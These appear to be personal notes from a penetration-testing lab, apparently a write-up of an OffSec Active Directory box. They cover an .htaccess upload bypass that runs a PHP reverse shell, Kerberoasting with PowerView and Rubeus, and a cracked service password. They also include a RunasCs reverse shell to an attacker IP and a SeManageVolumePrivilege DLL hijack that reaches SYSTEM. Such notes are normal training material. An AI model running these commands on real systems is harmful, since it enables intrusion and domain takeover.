standard AD ports + 443 https, 47001
fair assumption, we look at the 443

refered [https://portswigger.net/web-security/file-upload/]
Basically, to bypass php file blacklists, if we're able to upload .htaccess file, we can map any extension to php extension.
"
Apache `.htaccess` Bypass
If `.htaccess` uploads are permitted, we can upload config file to map any extension to PHP:
1. Upload a `.htaccess` file containing:  
    `AddType application/x-httpd-php .l33t`
2. Upload a file named `shell.l33t` containing PHP code.
"
Note, while uploading, make sure to right click, view hidden, to see the .htaccess file
now, we upload a full-fledged php reverse shell in the name of bd.l33t and see it gets uploaded. visit /uploads and click n the .l33t
svc-apache!

when we do net-users, we see one other user, svc_mysql
we try to asrep-roast from kali, and it doesnt work

For kerberoasting from kali, we need a password. Instead, we can use the Get-SPN.ps1 script to do get the SPN from victim machine [[AD Powershell scripts]]
`.\Get-SPN.ps1`
shows us 2, 1 for krbtgt another for svc_mssql
`SPN( 1 )   =       MSSQLSvc/DC.access.offsec`
Can use `Get-TGSCipher.ps1` to get the hash

```powershell
. .\powerview.ps1
Get-Netuser svc_mssql
#shows SPN
Invoke-Kerberoast
#performs kerberoast and gets the hash
```

Copy the hash, and crack it, after some post-processing of the text, we get
svc_mssql:trustno1
So, now we use Runas to get an rshell as svc_mssql
`.\RunasCs.exe svc_mssql trustno1 powershell.exe -r 192.168.45.199:445 --force-profile --logon-type 8`
svc_mssql !

---
whoami /priv shows a `SeManageVolumePrivilege`. This is something we havent seen before
https://hackfa.st/Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeManageVolumePrivilege/
provides a good insight about how it can be done
Basically,
1. check if the privilege is enabled. if enabled, skip to step 3
2. transfer and run `EnableAllTokenPrivs.ps1` script 
   `wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1`
   transfer to windows
   `. .\EnableAllTokenPrivs.ps1`
   magically, the priv is now enabled!
3. tranasfer the .exe binary from releases of CsEnox's github
   `wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe`
   transfer to windows
   `.\SeManageVolumeExploit.exe`
   should give F perms over C: to builtin:Users
4. copy, modify and transfer the Printconfig.c from `https://github.com/CsEnox/SeManageVolumeExploit/blob/main/Printconfig.c`
   Modify : replace pch.h with windows.h  and the payload to my ip, port, ming-compile it.
   `x86_64-w64-mingw32-gcc Printconfig.c --shared -o Printconfig.dll`
5. Place it at `C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll`
   `cp Printconfig.dll \Windows\System32\spool\drivers\x64\3\Printconfig.dll`
6. Initiate the PrintNotify object by executing the following PowerShell commands:
   ```powershell
   $type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
   #start listeninig on the port that you set
   $object = [Activator]::CreateInstance($type)
   ```
NT!!

---
---
---
Alternate method
performing kerberoast using rubeus
`.\rubeus.exe kerberoast /nowrap`